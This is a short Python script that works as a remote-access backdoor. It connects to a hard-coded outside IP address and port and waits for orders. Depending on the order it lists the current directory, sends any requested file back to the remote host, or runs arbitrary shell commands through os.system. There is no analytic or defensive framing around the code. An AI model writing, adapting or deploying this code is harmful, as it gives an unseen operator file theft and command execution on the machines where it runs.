import socket
import os

victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim.connect(("46.143.100.122", 900))

try:
    while True:
        order = victim.recv(1024).decode()
        print(order)
        if order == "1":
            Filelist=str(os.listdir("."))
            victim.send(Filelist.encode())
            fileName = victim.recv(1024).decode()
            file = open(fileName, "rb")
            victim.send(file.read())
        elif order=="2":
            victim.send(str(os.listdir(".")).encode())
        elif order == "3":
            victim.send("enter your command: ".encode())
            command=victim.recv(1024).decode()
            os.system(command)
            victim.send("done :)".encode())
        else:
            print(victim.recv(1024).decode()+"\a")
except:
    victim.send("connction fiald.....................")
